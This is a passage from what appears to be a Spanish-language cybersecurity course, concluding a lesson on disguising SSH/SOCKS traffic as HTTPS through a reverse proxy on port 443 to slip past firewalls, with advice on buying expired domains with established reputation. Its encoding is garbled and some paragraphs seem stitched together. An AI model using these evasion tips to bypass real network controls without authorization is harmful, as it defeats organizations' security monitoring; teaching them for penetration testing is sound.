![Maquina Cliente4](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/maquina-cliente4.png?raw=true)

## **Conclusi√≥n**

Con esta configuraci√≥n y t√©cnica del servidor proxy inverso podemos hacer que todo el tr√°fico O espec√≠fico aparezca como HTTPS(443). Una vez que el cliente establece su t√∫nel SSL con el servidor proxy inverso, el firewall no puede distinguir entre nuestro t√∫nel SSL y el tr√°fico HTTPS(443) normal debido al cifrado. En las redes p√∫blicas en general, esto es suficiente para evitar las restricciones del firewall. Esto tambi√©n funciona como alternativa de VPN en redes donde el tr√°fico VPN est√° bloqueado. Recuerde que s√≥lo el tr√°fico TCP puede atravesar el proxy ssh Socks o el reenv√≠o de puertos.

Cuando se trata de firewalls avanzados, existen muchos factores adicionales que pueden determinar si la conexi√≥n SSL est√° permitida a trav√©s del puerto 443. Los firewalls m√°s avanzados no solo pueden realizar inspecci√≥n SSL (descifrado), sino que tambi√©n pueden tomar decisiones para permitir el tr√°fico seg√∫n la direcci√≥n IP geogr√°fica de destino. ubicaci√≥n, atributos del certificado SSL, categorizaci√≥n del dominio y reputaci√≥n del dominio. Aqu√≠ es donde es crucial elegir un dominio con un TLD (dominio de nivel superior) com√∫n y un pa√≠s generalmente confiable para alojar el servidor proxy inverso.

> üëâ Se recomendar√≠a registrar un dominio caducado que ya tenga categorizaci√≥n de URL y buena reputaci√≥n. Si ha comprado un dominio nuevo, hay formas de clasificarlo y crear una reputaci√≥n de dominio. Estos no se tratar√°n aqu√≠, pero se abordar√°n en otro blog. Si lleg√≥ hasta aqu√≠, espero que haya sido √∫til y estoy seguro de que se le ocurrir√°n algunos casos de uso creativos para esta configuraci√≥n.
</aside>

Es fundamental comprender primero c√≥mo funciona un firewall antes de intentar hackearlo. Un firewall realiza un seguimiento de todo el tr√°fico de la red, tanto entrante como saliente, y, seg√∫n las reglas que se hayan configurado, permite o proh√≠be que ese tr√°fico llegue a su destino. El hecho de que los firewalls sean frecuentemente la l√≠nea inicial de defensa en una red los convierte en un ejemplo de seguridad perimetral.

Resumamos todo lo escrito anteriormente. Piense siempre fuera de lo com√∫n. Pruebe diferentes t√©cnicas de codificaci√≥n y algunas funcionar√°n. No seas perezoso en comprobar los registros DNS. No olvide que se puede eludir cualquier protecci√≥n en los recursos web y que WAF no es una panacea para todos los problemas. Los hackers no duermen y siempre buscan nuevas t√©cnicas para atacar tus recursos y obtener beneficios. Las pruebas de penetraci√≥n peri√≥dicas le ayudar√°n a evitar muchos problemas.